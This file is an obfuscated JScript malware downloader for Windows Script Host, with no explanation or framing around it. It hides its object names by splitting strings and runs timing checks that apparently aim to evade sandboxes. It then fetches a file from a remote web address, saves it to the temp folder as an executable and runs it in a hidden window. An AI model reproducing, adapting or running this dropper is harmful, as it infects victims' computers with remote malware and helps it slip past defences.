var JS = false;
var VZ = "Create"+"Object";
var A = function J() {return WScript[VZ]("WScript"+".Shell");}(), TQ = 11;
var U = "MSXML2"+".XMLHTTP";
var VU = 2;
var NN = VU - 2;
function IL(Y){A["Run"](Y, NN, NN);};
function E(){return U + "";};
function KP(ED, C0){NN = NN * 1; return ED - C0;};
function FB(){return VZ;};
/*@cc_on
  @if (@_win32 || @_win64)
    JS = true;
  @end
@*/
if (JS)
{
var B = "";
function L(){return 22;};
var JD = 0; var BG = 0;
function XS()
{
var H = new this["Date"]();
var HL = H["getUTCMilliseconds"]();
WScript["Sleep"](L());
var H = new this["Date"]();
var V = H["getUTCMilliseconds"]();
WScript["Sleep"](L());
var H = new this["Date"]();
var V0 = H["getUTCMilliseconds"]();
var JD = "ZJ";
JD = KP(V, HL);
var BG = "DF";
BG = KP(V0, V);
B = "open";
return KP(JD, BG);
}
var NM = false;
var J2 = false;
for (var C = NN; C < L() * 1; C++){if (XS() != NN){
NM = true; 
BG = "31" + 11 * JD + BG; 
J2 = true; 
break;
}}
function P() {return ((NM == true) && (NM == J2)) ? 1 : NN;};
if (NM && P() && J2){
function EF() {return A["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "ZRa4TOL87PD.ex" + "e";};
 KN = E();
 R = WScript[VZ](KN);
 var J1 = 1;
do { 
	for (;J1;){
	try {
		if (J1 == 1)
		{
			R[B]("GET", "http://drirenaeris.com.au/b7eir", false);
			R["send"]();
			AZ = "Sleep";
			J1 = 2;
		}
		WScript[AZ](L() + 120); 
		if (R["readystate"] < 2 * 2) continue;
		J1 = NN;
		function T(O) {var G = (1, 2, 3, 4, 5, O); return G;};
		ND = WScript[FB()]("ADODB.Stream");
		KN = ND;
		KN[B]();
		KN["type"] = T(1);
		KN["write"](R["ResponseBody"]);
		ND["position"] = T(NN);
		KN["Save" + "ToFile"](EF(), 2);
		ND["cl"+"ose"]();
		J0 = EF();
		IL(J0);
	} catch(Q){};};
}while (J1);
}
}

